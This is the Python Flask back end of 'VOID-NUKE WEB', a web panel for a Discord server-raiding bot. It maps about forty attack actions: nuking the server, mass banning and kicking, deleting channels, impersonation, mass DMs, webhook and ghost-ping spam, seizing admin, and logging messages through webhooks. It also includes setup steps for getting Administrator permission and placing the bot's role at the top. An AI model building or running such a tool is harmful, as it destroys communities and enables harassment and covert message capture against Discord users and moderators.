"""
VOID-NUKE WEB - Fixed execution + permissions + audioop
"""
import sys
try:
    import audioop
except ModuleNotFoundError:
    try:
        import audioop_lts as audioop
        sys.modules['audioop']=audioop
        print("[FIX] audioop-lts shim")
    except ImportError:
        import types
        sys.modules['audioop']=types.ModuleType("audioop")

import os, threading, asyncio, gc, time
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import discord
from discord.ext import commands
from dotenv import load_dotenv

from bot_manager import (
    manager, log_buffer, log_ok, log_err, log_info, log_warn,
    webhook_logger_check, REQUIRED_PERMISSIONS, REQUIRED_INTENTS
)

load_dotenv()
app = Flask(__name__)
CORS(app, resources={r"/api/*":{"origins":"*"}})
app.config['MAX_CONTENT_LENGTH']=1*1024*1024

bot_loop=None
bot_thread_obj=None

def create_bot():
    intents=discord.Intents.none()
    intents.guilds=True
    intents.members=True
    intents.bans=True
    intents.emojis=True
    intents.voice_states=True
    intents.messages=True
    intents.message_content=True
    bot=commands.Bot(command_prefix='!', intents=intents, max_messages=None, chunk_guilds_at_startup=False, member_cache_flags=discord.MemberCacheFlags.all())
    return bot

def run_bot(token, guild_id):
    global bot_loop
    bot_loop=asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    bot=create_bot()
    manager.bot=bot
    manager.guild_id=guild_id
    manager.loop=bot_loop

    @bot.event
    async def on_ready():
        manager.connected=True
        g=bot.get_guild(int(guild_id)) if guild_id else None
        if g:
            try: await g.chunk()
            except: pass
            manager.guild_info={"name":g.name,"id":str(g.id),"members":g.member_count,"channels":len(g.channels),"roles":len(g.roles),"icon":str(g.icon.url) if g.icon else None}
            log_ok(f"Connected to {g.name} ({g.member_count} members)")
            try:
                from bot_manager import BOT_PRESENCE
                from discord import Activity, ActivityType
                pt=getattr(ActivityType, BOT_PRESENCE["type"].lower(), ActivityType.playing)
                await bot.change_presence(activity=Activity(type=pt, name=BOT_PRESENCE["text"]))
            except: pass
        else:
            log_warn(f"Bot ready as {bot.user} but guild {guild_id} not found")
            guilds=[f"{x.name} ({x.id})" for x in bot.guilds[:10]]
            log_info(f"Available: {', '.join(guilds)}")

    @bot.event
    async def on_disconnect():
        manager.connected=False
        log_warn("Bot disconnected")

    @bot.event
    async def on_message(message):
        try: await webhook_logger_check(message)
        except: pass
        try: await bot.process_commands(message)
        except: pass

    try:
        bot_loop.run_until_complete(bot.start(token))
    except discord.LoginFailure:
        log_err("Invalid token")
        manager.connected=False
    except Exception as e:
        log_err(f"Bot error: {e}")
        manager.connected=False
    finally:
        try: bot_loop.run_until_complete(bot.close())
        except: pass
        try: bot_loop.close()
        except: pass
        gc.collect()

@app.route('/')
def index(): return render_template('index.html')

@app.route('/health')
def health():
    return jsonify({"status":"ok","bot_connected":manager.connected,"python":sys.version.split()[0],"audioop": "audioop" in sys.modules}),200

@app.route('/api/status')
def status_api():
    return jsonify({
        "connected":manager.connected,
        "guild":manager.guild_info,
        "guild_id":manager.guild_id,
        "bot_user":str(manager.bot.user) if manager.bot and manager.bot.user else None,
        "logs_count":len(log_buffer.logs),
        "python":sys.version.split()[0],
    })

@app.route('/api/permissions')
def permissions_api():
    """New: shows required perms + if bot has them + how to fix"""
    check = manager.check_permissions()
    if "error" in check and not check.get("has_guild"):
        return jsonify(check), 400

    # Build guide
    guide = {
        "steps": [
            "1. Go to https://discord.com/developers/applications → your bot → Bot tab",
            "2. Enable Privileged Gateway Intents: SERVER MEMBERS INTENT = ON, MESSAGE CONTENT INTENT = ON",
            "3. Save changes, then re-invite bot with admin: OAuth2 → URL Generator → Scopes: bot + applications.commands, Permissions: Administrator (8)",
            "4. Invite URL example: https://discord.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&permissions=8&scope=bot%20applications.commands",
            "5. Make sure bot role is ABOVE the roles it needs to manage in Server Settings → Roles (drag VOID-NUKE role to top)",
        ],
        "required_intents_details": REQUIRED_INTENTS,
        "required_perms_details": REQUIRED_PERMISSIONS,
    }

    # If has guild data, add extra diagnostics
    if check.get("has_guild"):
        g = manager.get_guild()
        if g:
            guide["diagnostics"] = {
                "bot_top_role": check.get("top_role"),
                "bot_top_role_pos": check.get("top_role_pos"),
                "guild_roles_count": len(g.roles),
                "is_owner": str(g.owner_id) == check.get("bot_id"),
            }

    return jsonify({"permissions_check": check, "guide": guide})

@app.route('/api/logs')
def get_logs():
    limit=min(int(request.args.get('limit',100)),500)
    logs=log_buffer.get_all()[-limit:]
    return jsonify(logs)

@app.route('/api/logs/clear', methods=['POST'])
def clear_logs():
    log_buffer.clear()
    return jsonify({"ok":True})

@app.route('/api/connect', methods=['POST'])
def connect():
    global bot_thread_obj, bot_loop
    data=request.get_json() or {}
    token=data.get('token','').strip()
    guild_id=data.get('guild_id','').strip()
    if not token or not guild_id: return jsonify({"error":"Token and Server ID required"}),400
    if not guild_id.isdigit(): return jsonify({"error":"Server ID must be numeric"}),400
    if manager.bot and manager.connected:
        try:
            if bot_loop: asyncio.run_coroutine_threadsafe(manager.bot.close(), bot_loop)
        except: pass
        time.sleep(1)
    log_info(f"Connecting to guild {guild_id}...")
    manager.guild_id=guild_id
    bot_thread_obj=threading.Thread(target=run_bot, args=(token,guild_id), daemon=True)
    bot_thread_obj.start()
    for _ in range(25):
        time.sleep(0.5)
        if manager.connected: break
    return jsonify({"ok":True,"connected":manager.connected,"message":"Bot starting, check logs"})

@app.route('/api/disconnect', methods=['POST'])
def disconnect():
    global bot_loop
    if manager.bot and bot_loop:
        try:
            future=asyncio.run_coroutine_threadsafe(manager.bot.close(), bot_loop)
            future.result(timeout=5)
            log_info("Bot disconnected by user")
        except Exception as e:
            log_err(f"Disconnect error: {e}")
    manager.connected=False
    manager.guild_info={}
    gc.collect()
    return jsonify({"ok":True})

@app.route('/api/guilds')
def guilds():
    if not manager.bot or not manager.connected: return jsonify({"error":"Bot not connected"}),400
    try:
        guild_list=[{"name":g.name,"id":str(g.id),"members":g.member_count} for g in manager.bot.guilds]
        return jsonify(guild_list)
    except Exception as e: return jsonify({"error":str(e)}),500

@app.route('/api/channels')
def channels():
    g=manager.get_guild()
    if not g: return jsonify({"error":"Guild not found"}),400
    all_ch=[{"name":c.name,"id":str(c.id),"type":str(c.type)} for c in g.channels]
    vcs=[{"name":c.name,"id":str(c.id)} for c in g.channels if isinstance(c,discord.VoiceChannel)]
    tcs=[{"name":c.name,"id":str(c.id)} for c in g.channels if isinstance(c,discord.TextChannel)]
    return jsonify({"all":all_ch,"voice":vcs,"text":tcs})

@app.route('/api/action', methods=['POST'])
def do_action():
    """Fixed execution - robust confirm handling"""
    if not manager.connected or not manager.bot:
        return jsonify({"error":"Bot not connected - connect first","need_connect":True}),400
    data=request.get_json(silent=True) or {}
    action=data.get("action")
    params=data.get("params", {}) or {}
    
    # Debug log
    print(f"[API ACTION] Got action={action} params={params}", flush=True)
    log_info(f"API /action -> {action} {params}")

    if not action:
        return jsonify({"error":"No action provided"}),400

    action_map={
        "01":"nuke","nuke":"nuke",
        "02":"auto_raid","auto_raid":"auto_raid",
        "03":"ban_all","ban_all":"ban_all",
        "04":"kick_all","kick_all":"kick_all",
        "05":"mute_all","mute_all":"mute_all",
        "06":"unban_all","unban_all":"unban_all",
        "07":"delete_channels","del_channels":"delete_channels","delete_channels":"delete_channels",
        "08":"delete_emojis","del_emojis":"delete_emojis","delete_emojis":"delete_emojis",
        "09":"delete_stickers","del_stickers":"delete_stickers","delete_stickers":"delete_stickers",
        "10":"create_channels","create_channels":"create_channels",
        "11":"create_roles","create_roles":"create_roles",
        "12":"create_cats","create_cats":"create_cats","create_categories":"create_cats",
        "13":"rename_channels","rename_channels":"rename_channels",
        "14":"rename_roles","rename_roles":"rename_roles",
        "15":"edit_server","edit_server":"edit_server","change_server":"edit_server",
        "16":"rename_members","rename_members":"rename_members","nick_all":"rename_members",
        "17":"fix_nicks","fix_nicks":"fix_nicks","dehoist_all":"fix_nicks",
        "18":"get_admin","get_admin":"get_admin",
        "19":"impersonate","impersonate":"impersonate",
        "20":"ghost_ping","ghost_ping":"ghost_ping","ghost_ping_all":"ghost_ping",
        "21":"strip_roles","strip_roles":"strip_roles","remov_roles":"strip_roles",
        "22":"dm_all","dm_all":"dm_all","message_all":"dm_all",
        "23":"dm_spam_user","dm_spam_user":"dm_spam_user",
        "24":"webhook_spam","webhook_spam":"webhook_spam",
        "25":"server_info","server_info":"server_info",
        "26":"clone_server","clone_server":"clone_server",
        "27":"webhook_logger","webhook_logger":"webhook_logger","webhook_logs":"webhook_logger",
        "28":"lockdown","lockdown":"lockdown",
        "29":"deafen_all","deafen_all":"deafen_all","sourdine_vc":"deafen_all",
        "30":"disconnect_all","disconnect_all":"disconnect_all","kick_vc_all":"disconnect_all",
        "31":"mass_move","mass_move":"mass_move","move_all_vc":"mass_move",
        "32":"invite_spam","invite_spam":"invite_spam",
        "33":"spam","spam":"spam","spam_channel":"spam",
        "34":"thread_spam","thread_spam":"thread_spam",
        "35":"reaction_spam","reaction_spam":"reaction_spam",
        "36":"vc_spam","vc_spam":"vc_spam","voice_spam":"vc_spam",
        "37":"spoiler_spam","spoiler_spam":"spoiler_spam",
        "38":"poll_spam","poll_spam":"poll_spam",
        "39":"event_spam","event_spam":"event_spam",
    }
    mapped=action_map.get(str(action).lower(), str(action).lower())
    func=manager.ACTIONS.get(mapped)
    if not func:
        err=f"Unknown action '{action}' -> '{mapped}' not in {list(manager.ACTIONS.keys())[:10]}"
        log_err(err)
        return jsonify({"error":err}),400

    # Handle confirm: accept True, "true", "on", 1, etc from frontend checkbox
    confirm_raw = params.get("confirm", False)
    is_confirmed = False
    if isinstance(confirm_raw, bool):
        is_confirmed = confirm_raw
    elif isinstance(confirm_raw, str):
        is_confirmed = confirm_raw.lower() in ("true","1","yes","on")
    elif isinstance(confirm_raw, (int,float)):
        is_confirmed = bool(confirm_raw)

    destructive={"nuke","ban_all","kick_all","delete_channels","auto_raid"}
    if mapped in destructive and not is_confirmed:
        return jsonify({"error":f"Action '{mapped}' requires confirmation","need_confirm":True}),400

    # Ensure params are proper types - convert empty strings to defaults handling in bot_manager
    cleaned_params={}
    for k,v in params.items():
        if v=="" or v is None:
            continue
        cleaned_params[k]=v
    # preserve confirm as bool for logging
    cleaned_params["confirm"]=is_confirmed

    try:
        if manager.loop and manager.bot:
            coro=func(manager, cleaned_params)
            future=asyncio.run_coroutine_threadsafe(coro, manager.loop)
            # Wait a tiny bit to catch immediate errors
            try:
                future.result(timeout=0.2)
            except asyncio.TimeoutError:
                pass # normal - task running
            except Exception as e:
                log_err(f"Action {mapped} immediate fail: {e}")
                return jsonify({"error":f"Action failed immediately: {e}"}),500

            log_info(f"Started action: {mapped} with {cleaned_params}")
            return jsonify({"ok":True,"action":mapped,"message":f"Task {mapped} started, check Live Logs"})
        else:
            return jsonify({"error":"Bot loop not ready"}),500
    except Exception as e:
        import traceback
        tb=traceback.format_exc()
        print(tb, flush=True)
        log_err(f"Action {mapped} failed: {e}")
        return jsonify({"error":str(e),"traceback":tb[:1000]}),500

if __name__=='__main__':
    port=int(os.environ.get('PORT',10000))
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)
